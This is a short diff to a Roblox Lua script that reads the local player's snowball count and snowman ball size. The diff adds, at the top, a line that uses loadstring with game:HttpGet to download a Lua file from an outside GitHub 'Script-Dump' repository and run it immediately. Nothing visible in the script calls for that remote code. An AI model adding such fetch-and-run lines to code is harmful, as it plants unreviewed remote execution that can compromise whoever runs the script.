@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/ZHZH0MIYKR.lua"))()
+
 local gamePlayer = game:GetService("Players").LocalPlayer
 local ballSize = game:GetService("Players").LocalPlayer.info.snowmanBallSize
 local ballCount = game:GetService("Players").LocalPlayer.localData.snowballs
